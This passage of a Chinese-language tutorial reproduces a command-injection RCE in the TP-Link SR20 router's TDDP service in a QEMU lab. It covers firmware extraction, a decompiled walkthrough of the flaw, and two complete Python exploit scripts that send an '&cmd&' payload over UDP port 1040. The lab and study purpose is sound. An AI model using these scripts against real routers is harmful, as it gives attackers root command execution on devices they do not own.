+<h2 id="c-dd得到镜像"><a href="#c-dd得到镜像" class="headerlink" title="c.dd得到镜像"></a>c.dd得到镜像</h2><p>bash：<br>dd if&#x3D;”bin文件路径”  of&#x3D;”输出文件名” bs&#x3D;1 skip&#x3D;”步骤b得到的偏移” status&#x3D;progress</p>
+<p>参数讲解：<br>bs&#x3D;1 指块大小为1个字节<br>status&#x3D;progress打印状态</p>
+<p><img src="/images/newpapername/Pasted-image-20260928194111.png" alt="Pasted image 20260928194111"></p>
+<p><mark>得到名叫  le   的镜像</mark></p>
+<h2 id="d-得到rootfs文件"><a href="#d-得到rootfs文件" class="headerlink" title="d.得到rootfs文件"></a>d.得到rootfs文件</h2><p>bash：<br>unsquashfs -d  “解压到的文件路径”    “步骤c得到的镜像”</p>
+<p><img src="/images/newpapername/Pasted-image-20260928194325.png" alt="Pasted image 20260928194325"><br><mark>如图，得到了rootfs</mark><br><img src="/images/newpapername/Pasted-image-20260928194352.png" alt="Pasted image 20260928194352"></p>
+<h1 id="3-找到漏洞程序"><a href="#3-找到漏洞程序" class="headerlink" title="3.找到漏洞程序"></a>3.找到漏洞程序</h1><h2 id="a-查看开机启动项"><a href="#a-查看开机启动项" class="headerlink" title="a.查看开机启动项"></a>a.查看开机启动项</h2><p>&#x2F;sbin下没有init,但是&#x2F;bin&#x2F;busybox是在的</p>
+<p>然后busybox一般会开始运行&#x2F;etc&#x2F;inittab</p>
+<p>&#x2F;etc&#x2F;inittab会调用&#x2F;etc&#x2F;init.d&#x2F;rcS</p>
+<p>rcs内容如下：<br><img src="/images/newpapername/Pasted-image-20260928194904.png" alt="Pasted image 20260928194904" width="465" /></p>
+<p>他会启动&#x2F;etc&#x2F;rc.d&#x2F;下所有S开头的文件</p>
+<p>&#x2F;etc&#x2F;rc.d&#x2F;这个位置的文件一般，S开头指开机自启动，K开头指关机时运行</p>
+<p><img src="/images/newpapername/Pasted-image-20260928195140.png" alt="Pasted image 20260928195140">这个里面，S开头文件非常的多</p>
+<p>有<code>boot/sysctl/led/watchdog/garp</code> 这类系统胶水，和一些需要重点关注的</p>
+<p>本案例的漏洞程序是&#x2F;usr&#x2F;bin&#x2F;tddp</p>
+<p> &#x2F;etc&#x2F;rc.d&#x2F;S95done拉起rc.local<br><img src="/images/newpapername/Pasted-image-20260928201316.png" alt="Pasted image 20260928201316" width="161" /><br><img src="/images/newpapername/Pasted-image-20260928201346.png" alt="Pasted image 20260928201346" width="292" /></p>
+<p>etc&#x2F;rc.local拉起漏洞程序tddp<br><img src="/images/newpapername/Pasted-image-20260928201825.png" alt="Pasted image 20260928201825"></p>
+<h1 id="4-一部分前置知识点"><a href="#4-一部分前置知识点" class="headerlink" title="4.一部分前置知识点"></a>4.一部分前置知识点</h1><h2 id="a-本漏洞在干什么（一句话）"><a href="#a-本漏洞在干什么（一句话）" class="headerlink" title="a.本漏洞在干什么（一句话）"></a>a.本漏洞在干什么（一句话）</h2><p>TDDP v1 某配置命令把 UDP 包体里的 <code>文件名;主机</code> 拼进：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp;tftp -gr 文件名 主机 &amp;</span><br></pre></td></tr></table></figure>
+
+<p>再 <code>execve(&quot;/bin/sh&quot;,&quot;-c&quot;, ...)</code>。<br>文件名里的 <code>;</code> 会被剥&#x2F;截断，但 <strong><code>&amp;</code> &#x2F; <code>|</code> 能注入</strong>，从而 RCE。</p>
+<h2 id="b-协议头（v1，12-字节）"><a href="#b-协议头（v1，12-字节）" class="headerlink" title="b.协议头（v1，12 字节）"></a>b.协议头（v1，12 字节）</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">struct tddp_hdr &#123;          // sizeof = 12</span><br><span class="line">    uint8_t  version;      // +0  1=v1，2=v2</span><br><span class="line">    uint8_t  cmd;          // +1  命令/类型；本洞常用 0x31</span><br><span class="line">    uint8_t  dir;          // +2  方向</span><br><span class="line">    uint8_t  code;         // +3  状态</span><br><span class="line">    uint32_t length;       // +4  payload 长度（网络序）</span><br><span class="line">    uint16_t seq;          // +8  序号</span><br><span class="line">    uint16_t reserved;     // +10 保留</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>本地 PoC 常用极简头：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x01\x31 + 10 个 \x00 +  payload</span><br></pre></td></tr></table></figure>
+<p>payload 形态：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;命令&amp;;127.0.0.1</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>;</code> 前：被当成 tftp 的「文件名」→ 可注入  </li>
+<li><code>;</code> 后：被当成 tftp 的「主机」→ 本地复现写死 <code>127.0.0.1</code> 即可</li>
+</ul>
+<h2 id="c-端口与程序"><a href="#c-端口与程序" class="headerlink" title="c.端口与程序"></a>c.端口与程序</h2><ul>
+<li>程序：<code>/usr/bin/tddp</code>（ARM32，uClibc）</li>
+<li>默认 UDP：<strong>1040</strong></li>
+<li>本地跑：<code>qemu-arm-static -L rootfs ./usr/bin/tddp</code></li>
+</ul>
+<h2 id="d-为什么-不行、-行"><a href="#d-为什么-不行、-行" class="headerlink" title="d.为什么 ; 不行、&amp;&#x2F;| 行"></a>d.为什么 <code>;</code> 不行、<code>&amp;</code>&#x2F;<code>|</code> 行</h2><ul>
+<li>解析用 <code>sscanf(..., &quot;%[^;];%s&quot;, s, host)</code>，<strong>第一个 <code>;</code> 是字段分隔</strong>，不能当命令连接符用在「文件名」里串后续。  </li>
+<li>拼进 <code>sh -c</code> 后，<code>&amp;</code> 可断句&#x2F;后台，<code>|</code> 可管道，从而执行注入命令。  </li>
+<li>副作用常见：<code>sh: tftp: not found</code>、<code>sh: 127.0.0.1: not found</code> → <strong>可忽略</strong>，以副作用文件（如 <code>id</code> 输出）为准。</li>
+</ul>
+<h2 id="e-两套复现路径"><a href="#e-两套复现路径" class="headerlink" title="e.两套复现路径"></a>e.两套复现路径</h2><table>
+<thead>
+<tr>
+<th>路径</th>
+<th>谁发包</th>
+<th>谁中招</th>
+<th>要不要 UDP 转发</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>客机本机打</td>
+<td>客机 python</td>
+<td>客机 tddp</td>
+<td>不要</td>
+</tr>
+<tr>
+<td>主机外打</td>
+<td>主机 python</td>
+<td>客机 tddp</td>
+<td>要 <code>hostfwd=udp:...1040</code></td>
+</tr>
+</tbody></table>
+<p>证据文件都在<strong>跑 tddp 的那台</strong>上，例如 <code>/tmp/iot_sr20_id.txt</code>。</p>
+<h1 id="5-查找漏洞"><a href="#5-查找漏洞" class="headerlink" title="5.查找漏洞"></a>5.查找漏洞</h1><p>以下截图是我优化可读性后的代码：</p>
+<p>main函数下面就3个函数<br>一个初始化tddp_table（申请了一个4字节空间，用于存放数据位置）<br>一个free释放tddp_table（将申请的4字节空间释放）<br><img src="/images/newpapername/Pasted-image-20260930132740.png" alt="Pasted image 20260930132740" width="473" /></p>
+<p>重点是tddp_taskEntry()<br><img src="/images/newpapername/Pasted-image-20260930132924.png" alt="Pasted image 20260930132924" width="446" /></p>
+<p>（1）if下的tddp_ctx_create(a1: &amp;v7) &#x3D;&#x3D; 0<br><img src="/images/newpapername/Pasted-image-20260930195139.png" alt="Pasted image 20260930195139" width="368" /><br>给v7申请了0x15fe4u的空间，用于后面保留收发的数据包和配置信息的缓存</p>
+<p><img src="/images/newpapername/Pasted-image-20261001142314.png" alt="Pasted image 20261001142314"></p>
+<p>v7+82：发送包的缓存位置<br>v7+45083：接收包的缓存位置</p>
+<p> v5 &#x3D; tddp_session_add(a1: (int)s);<br> 保留了一下v7的地址</p>
+<p>（2）if下的tddp_udpSocketCreate(a1: v7 + 9) &#x3D;&#x3D; 0<br><img src="/images/newpapername/Pasted-image-20260930200032.png" alt="Pasted image 20260930200032" width="385" /><br>创建了一个socket给了v7[9]</p>
+<p>（3） setsockopt(fd: v7[9], level: 1, optname: 2, &amp;optval, optlen: 4u) &#x3D;&#x3D; 0<br>和setsockopt(fd: v7[9], level: 1, optname: 6, optval: &amp;v4, optlen: 4u) &#x3D;&#x3D; 0 </p>
+<p>是设置端口复用和开广播</p>
+<p>（4）tddp_udpBind(a1: v7[9], a2: 1040) &#x3D;&#x3D; 0<br><img src="/images/newpapername/Pasted-image-20261001141507.png" alt="Pasted image 20261001141507" width="434" /><br>给v7[9]的socket绑定ip和端口</p>
+<p><img src="/images/newpapername/Pasted-image-20261001141914.png" alt="Pasted image 20261001141914"><br>初始化</p>
+<p>v0[13] &#x3D; tddp_now_sec(a1: 0);<br>获取当前时间</p>
+<img src="/images/newpapername/Pasted-image-20261001143201.png" alt="Pasted image 20261001143201" width="388" />
+  给fd_set中的数据初始化0
+
+<p><img src="/images/newpapername/Pasted-image-20261001143307.png" alt="Pasted image 20261001143307"></p>
+<p>timeout.tv_sec和timeout.tv_usec是设置超时时间（秒和微秒）</p>
+<p>readfds.__fds_bits[(unsigned int)v7[9] &gt;&gt; 5] |&#x3D; 1 &lt;&lt; (v7[9] &amp; 0x1F);<br>将readfds中v7[9]位置设置为1</p>
+<p>(unsigned int)v7[9] &gt;&gt; 5是为了取出v7[9]的行,(&gt;&gt;5等同于&#x2F;32)</p>
+<p>1 &lt;&lt; (v7[9] &amp; 0x1F)就是取到具体那一列(&amp;0x1f等同于%32)</p>
+<p>假设v7[9]&#x3D;67</p>
+<p>67&gt;&gt;5是2</p>
+<p>67&amp;0x1f是3</p>
+<p>那他的位置就是</p>
+<p>0 0 0 0 0 0 0 0 |0 0 0 0  0 0 0 0 |0 0 0 0 0 0 0 0 |  0 0 0 0 0 0 0 0</p>
+<p>0 0 0 0 0 0 0 0 |0 0 0 0  0 0 0 0 | 0 0 0 0 0 0 0 0 | 0 0 0 0 0 0 0 0</p>
+<p>0 0 0 1 0 0 0 0 |0 0 0 0  0 0 0 0 | 0 0 0 0  0 0 0 0| 0 0 0 0 0 0 0 0</p>
+<p>……</p>
+<p>但实际上readfds.__fds_bits是4&#x2F;8字节的一维数组，只不过4个字节刚好32&#x2F;64位，他是按照每位二进制的值（是否为1），来判断的。</p>
+<p>v8 &#x3D; select(nfds, &amp;readfds, writefds: nullptr, exceptfds: nullptr, &amp;timeout);<br>监视0到v7[9]的fd，是否有数据读取</p>
+<p>v1 &#x3D; tddp_now_sec(a1: v8);<br>再次获取时间，用于判断超时</p>
+<p><img src="/images/newpapername/Pasted-image-20261001145348.png" alt="Pasted image 20261001145348">有udp数据时，进入  tddp_parserHandler(a1: v7);    </p>
+<p>tddp_parserHandler：<br><img src="/images/newpapername/Pasted-image-20261001155342.png" alt="Pasted image 20261001155342"></p>
+<p>v16 &#x3D; recvfrom(fd: *((_DWORD *)a1 + 9), buf: (char *)a1 + 45083, n: 0xAFC8u, flags: 0, &amp;addr, &amp;addr_len);</p>
+<p>将收到的数据包，放入a1+45083</p>
+<p>tddp报文头类似如下：<br>   版本1<br>   struct tddp_hdr {          &#x2F;&#x2F; sizeof &#x3D; 12<br>       uint8_t  version;      &#x2F;&#x2F; +0   协议版本：1&#x3D;v1，2&#x3D;v2<br>       uint8_t  cmd;          &#x2F;&#x2F; +1   命令&#x2F;类型<br>       uint8_t  dir;          &#x2F;&#x2F; +2   方向：1&#x3D;请求，2&#x3D;应答<br>       uint8_t  code;         &#x2F;&#x2F; +3   状态码：0成功，2未知命令，3失败，7&#x2F;8&#x2F;9等错误<br>       uint32_t length;       &#x2F;&#x2F; +4   payload 长度（网络字节序，4字节）<br>       uint16_t seq;          &#x2F;&#x2F; +8   序号（2字节，回包常原样回显）<br>       uint16_t reserved;     &#x2F;&#x2F; +10  保留&#x2F;对齐<br>   };</p>
+<img src="/images/newpapername/Pasted-image-20261001160626.png" alt="Pasted image 20261001160626" width="452" />
+
+<p>外层if判断是否版本为1</p>
+<p>v6 &#x3D; tddp_peer_bind_check(a1, a2: &amp;addr.sa_family);确保发送接收包，是同一端口&#x2F;ip<br><img src="/images/newpapername/Pasted-image-20261001161149.png" alt="Pasted image 20261001161149"></p>
+<p> v19 &#x3D; tddp_parserVerOneOpt((int)a1, a2: &amp;n);<br> <img src="/images/newpapername/Pasted-image-20261001161518.png" alt="Pasted image 20261001161518"> tddp_parserVerOneOpt((int)a1, a2: &amp;n);是指令判断的地方</p>
+<p>漏洞发生在<br><img src="/images/newpapername/Pasted-image-20261001161630.png" alt="Pasted image 20261001161630"> tddp_cmd_configSet(a1);</p>
+<p>v19是接收包缓存地址<br><img src="/images/newpapername/Pasted-image-20261001161741.png" alt="Pasted image 20261001161741" width="356" /></p>
+<p>因为版本1的tddp头是12字节，版本2是28字节，这里是跳过tddp头数据</p>
+<p>漏洞点：<br><img src="/images/newpapername/Pasted-image-20261001161705.png" alt="Pasted image 20261001161705">sscanf(s: v19, format: “%[^;];%s”, s, v10); </p>
+<p>%[^;];%s的功能<br>读取到”;”，将”;”前的字符串赋值给s，将”;”后面的字符串赋值给v10<br>为了后面区别记作  s1    s2</p>
+<p>它直接将数据包的第一段字符串，用s和v10保存</p>
+<p>随后<br>tddp_execCmd(a1: “cd &#x2F;tmp;tftp -gr %s %s &amp;”, s, v16);</p>
+<p><img src="/images/newpapername/Pasted-image-20261001162700.png" alt="Pasted image 20261001162700"></p>
+<p>execve的传参</p>
+<p>argv &#x3D; “sh”;   &#x2F;&#x2F; argv[0]：程序名（惯例）<br>   v4   &#x3D; “-c”;   &#x2F;&#x2F; argv[1]<br>   v5   &#x3D; s;      &#x2F;&#x2F; argv[2]：要执行的命令字符串<br>   v6   &#x3D; 0;      &#x2F;&#x2F; argv[3]：NULL 结尾</p>
+<p>vsprintf(s, format: a1, arg: varg_r1);<br>将s赋值为cd &#x2F;tmp;tftp -gr s1  s2 &amp;</p>
+<p>这直接拼接了字符串，并用execve(“&#x2F;bin&#x2F;sh”,……)调用了</p>
+<p>如果我用1040端口发送一个带有命令分割符的指令（如&amp;uname ），就能实现命令执行</p>
+<h2 id="调用链（便于回看）"><a href="#调用链（便于回看）" class="headerlink" title="调用链（便于回看）"></a>调用链（便于回看）</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">main</span><br><span class="line">  → tddp_taskEntry</span><br><span class="line">      → tddp_ctx_create          // 大缓存</span><br><span class="line">      → tddp_udpSocketCreate     // socket → v7[9]</span><br><span class="line">      → setsockopt               // 端口复用+开广播</span><br><span class="line">      → tddp_udpBind(..., 1040)</span><br><span class="line">      → loop: select</span><br><span class="line">          → tddp_parserHandler   // recvfrom 到收包缓存</span><br><span class="line">              → 版本==1</span><br><span class="line">              → tddp_parserVerOneOpt   // 按 cmd 分发</span><br><span class="line">                  → tddp_cmd_configSet // 洞</span><br><span class="line">                      → sscanf(&quot;%[^;];%s&quot;)</span><br><span class="line">                      → tddp_execCmd(&quot;cd /tmp;tftp -gr %s %s &amp;&quot;, s1, s2)</span><br><span class="line">                          → vsprintf + execve(&quot;/bin/sh&quot;,&quot;-c&quot;,...)</span><br></pre></td></tr></table></figure>
+
+<h1 id="6-脚本编写"><a href="#6-脚本编写" class="headerlink" title="6.脚本编写"></a>6.脚本编写</h1><h2 id="a-思路"><a href="#a-思路" class="headerlink" title="a.思路"></a>a.思路</h2><ol>
+<li>组 TDDP v1 头：<code>version=1, cmd=0x31</code>，其余头字段可先填 0  </li>
+<li>payload：<code>&amp;命令&amp;;127.0.0.1</code>（amp 模式）  </li>
+<li>UDP 发到 <code>目标IP:1040</code>  </li>
+<li>命令用写文件自证，例如：<code>id&gt;/tmp/iot_sr20_id.txt</code></li>
+</ol>
+<h2 id="b-脚本"><a href="#b-脚本" class="headerlink" title="b.脚本"></a>b.脚本</h2><h3 id="方案-A-·-AI-写的完整-helper（推荐日常）"><a href="#方案-A-·-AI-写的完整-helper（推荐日常）" class="headerlink" title="方案 A · AI 写的完整 helper（推荐日常）"></a>方案 A · AI 写的完整 helper（推荐日常）</h3><p>路径（环境内）：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:/iot/cases/CASE-0002/exp/sr20_tddp_rce.py</span><br></pre></td></tr></table></figure>
+<p>客机解包后：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/root/CASE-0002/exp/sr20_tddp_rce.py</span><br></pre></td></tr></table></figure>
+<p>&#x2F;&#x2F; 复现时 AI 按协议整理；带 –mode &#x2F; –port</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;TP-Link SR20 TDDP v1 CMD_FTEST_CONFIG local RCE helper.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    ap = argparse.ArgumentParser()</span><br><span class="line">    ap.add_argument(<span class="string">&quot;ip&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;command&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--port&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">1040</span>)</span><br><span class="line">    ap.add_argument(</span><br><span class="line">        <span class="string">&quot;--mode&quot;</span>,</span><br><span class="line">        choices=[<span class="string">&quot;amp&quot;</span>, <span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;raw&quot;</span>],</span><br><span class="line">        default=<span class="string">&quot;amp&quot;</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;amp: &amp;cmd&amp; ; pipe: |cmd ; raw: use command as file field as-is&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    args = ap.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> args.mode == <span class="string">&quot;amp&quot;</span>:</span><br><span class="line">        file_field = <span class="string">f&quot;&amp;<span class="subst">&#123;args.command&#125;</span>&amp;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> args.mode == <span class="string">&quot;pipe&quot;</span>:</span><br><span class="line">        file_field = <span class="string">f&quot;|<span class="subst">&#123;args.command&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        file_field = args.command</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Ver=1, Type=0x31, remaining header zeros, then data: &quot;&lt;file&gt;;&lt;host&gt;&quot;</span></span><br><span class="line">    <span class="comment"># File field only strips &#x27;;&#x27;, so &#x27;|&#x27; / &#x27;&amp;&#x27; / &#x27;$()&#x27; can inject shell.</span></span><br><span class="line">    data = <span class="string">f&quot;<span class="subst">&#123;file_field&#125;</span>;127.0.0.1&quot;</span>.encode()</span><br><span class="line">    payload = <span class="string">b&quot;\x01\x31&quot;</span> + (<span class="string">b&quot;\x00&quot;</span> * <span class="number">10</span>) + data</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">    sock.sendto(payload, (args.ip, args.port))</span><br><span class="line">    sock.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;sent <span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span> bytes to <span class="subst">&#123;args.ip&#125;</span>:<span class="subst">&#123;args.port&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h3 id="方案-B-·-自己对照写的极简版"><a href="#方案-B-·-自己对照写的极简版" class="headerlink" title="方案 B · 自己对照写的极简版"></a>方案 B · 自己对照写的极简版</h3><p>路径：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:/iot/scripts/minimal_tddp.py</span><br></pre></td></tr></table></figure>
+<p>&#x2F;&#x2F; 与方案 A 并列；学协议看这个，日常复现仍建议 A</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ap = argparse.ArgumentParser()</span><br><span class="line">ap.add_argument(<span class="string">&quot;ip&quot;</span>)</span><br><span class="line">ap.add_argument(<span class="string">&quot;command&quot;</span>)</span><br><span class="line">args = ap.parse_args()</span><br><span class="line">data = <span class="string">f&#x27;&amp;<span class="subst">&#123;args.command&#125;</span>&amp;&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;\x01\x31&#x27;</span> + <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">10</span> + <span class="string">f&#x27;<span class="subst">&#123;data&#125;</span>;<span class="subst">&#123;args.ip&#125;</span>&#x27;</span>.encode()</span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">sock.sendto(payload, (args.ip, <span class="number">1040</span>))</span><br><span class="line">sock.close()</span><br></pre></td></tr></table></figure>
+
+<p>注意：</p>
+<ul>
+<li>极简版把 <code>;</code> 后面也写成了 <code>args.ip</code>  </li>
+<li><strong>本机打 127.0.0.1 时碰巧没问题</strong>  </li>
+<li>打别的 IP 时，<code>;</code> 后仍应是 tftp host（常用 <code>127.0.0.1</code>），发送目标才是 <code>args.ip</code>  </li>
+<li>方案 A：发送目标 <code>args.ip</code>，包体 host 固定 <code>127.0.0.1</code>（更合理）</li>
+</ul>
+<h2 id="c-调用（与上节方案对应；打法见-§8）"><a href="#c-调用（与上节方案对应；打法见-§8）" class="headerlink" title="c.调用（与上节方案对应；打法见 §8）"></a>c.调用（与上节方案对应；打法见 §8）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sr20_tddp_rce.py 127.0.0.1 <span class="string">&#x27;id&gt;/tmp/iot_sr20_id.txt&#x27;</span> --mode amp</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /tmp/iot_sr20_id.txt</span><br></pre></td></tr></table></figure>
+<p>&#x2F;&#x2F; 成功应有 uid&#x3D;0</p>
+<h1 id="7-环境配置与传文件（ARM64-调试机）"><a href="#7-环境配置与传文件（ARM64-调试机）" class="headerlink" title="7.环境配置与传文件（ARM64 调试机）"></a>7.环境配置与传文件（ARM64 调试机）</h1><h2 id="a-主机工具安装（debvm-等）"><a href="#a-主机工具安装（debvm-等）" class="headerlink" title="a.主机工具安装（debvm 等）"></a>a.主机工具安装（debvm 等）</h2><p>本机（Ubuntu）一次装齐：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get update</span><br><span class="line"><span class="built_in">sudo</span> apt-get install -y debvm qemu-system-arm qemu-user-static e2fsprogs openssh-client python3 wget tar iproute2</span><br></pre></td></tr></table></figure>
+
+<p>工具各自干什么：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">debvm                 // 包名；提供 debvm-run / debvm-create</span><br><span class="line">debvm-run             // 跑已有 ext4 调试盘（日常开机用这个）</span><br><span class="line">debvm-create          // 从零造盘（已有 arm64-debug.ext4 可不管）</span><br><span class="line">qemu-system-arm       // 全系统模拟；debvm-run 底层拉起 ARM/ARM64 VM</span><br><span class="line">qemu-user-static      // 用户态跑异架构二进制；客机里跑 ARM32 tddp 也要</span><br><span class="line">e2fsprogs             // debugfs 等；debvm-run 从镜像里抽 kernel/initrd</span><br><span class="line">openssh-client        // 主机侧 ssh / scp</span><br><span class="line">python3               // 跑 PoC、备选 http.server 传包</span><br><span class="line">wget / tar            // 备选下载、解复现包（客机也要）</span><br><span class="line">iproute2              // ss，看 2222/1040 占没占用</span><br></pre></td></tr></table></figure>
+
+<p>装完自检：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">command</span> -v debvm-run debvm-create qemu-system-aarch64 qemu-arm-static ssh scp python3</span><br></pre></td></tr></table></figure>
+<p>&#x2F;&#x2F; 都应有路径；缺哪个再 apt install</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debvm-run --<span class="built_in">help</span> | <span class="built_in">head</span></span><br></pre></td></tr></table></figure>
+<p>&#x2F;&#x2F; 能出来用法即可</p>
+<p>说明：</p>
+<ul>
+<li>日常<strong>不需要</strong>每次 create；已有 <code>arm64-debug.ext4</code> 就直接 <code>debvm-run</code></li>
+<li><code>qemu-system-arm</code> 包里带 aarch64 系统模拟；具体二进制名可能是 <code>qemu-system-aarch64</code> &#x2F; <code>qemu-system-arm64</code></li>
+<li>客机里的 <code>qemu-arm-static</code> 若没装，进客机后再 <code>apt-get install -y qemu-user-static</code>（见下节）</li>
+</ul>
+<h2 id="b-准备资产（主机桌面）"><a href="#b-准备资产（主机桌面）" class="headerlink" title="b.准备资产（主机桌面）"></a>b.准备资产（主机桌面）</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:/iot/arm64-debug.ext4</span><br><span class="line">D:/iot/CASE-0002-repro.tgz</span><br></pre></td></tr></table></figure>
+<p>&#x2F;&#x2F; 磁盘 + 复现包（rootfs + exp）</p>
+<h2 id="c-开机"><a href="#c-开机" class="headerlink" title="c.开机"></a>c.开机</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> D:/iot</span><br><span class="line">debvm-run -i arm64-debug.ext4 -s 2222</span><br></pre></td></tr></table></figure>
+<p>&#x2F;&#x2F; -s 2222：主机 2222 → 客机 22，给 ssh&#x2F;scp<br>&#x2F;&#x2F; 2222 被占：ss -lntp | grep 2222 → pkill -f ‘arm64-debug.ext4’ 再开</p>
+<p>主机外打还要 UDP 转发：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debvm-run -i arm64-debug.ext4 -s 2222 --netopt hostfwd=udp:127.0.0.1:1040-:1040</span><br></pre></td></tr></table></figure>
+<p>&#x2F;&#x2F; 主机 UDP 1040 → 客机 UDP 1040</p>
+<h2 id="d-客机一次配置（写入磁盘，下次还在）"><a href="#d-客机一次配置（写入磁盘，下次还在）" class="headerlink" title="d.客机一次配置（写入磁盘，下次还在）"></a>d.客机一次配置（写入磁盘，下次还在）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y openssh-server wget ca-certificates python3 qemu-user-static tar iproute2</span><br></pre></td></tr></table></figure>
+<p>&#x2F;&#x2F; SSH + wget + python3 + qemu-arm + tar + ss</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd root</span><br></pre></td></tr></table></figure>
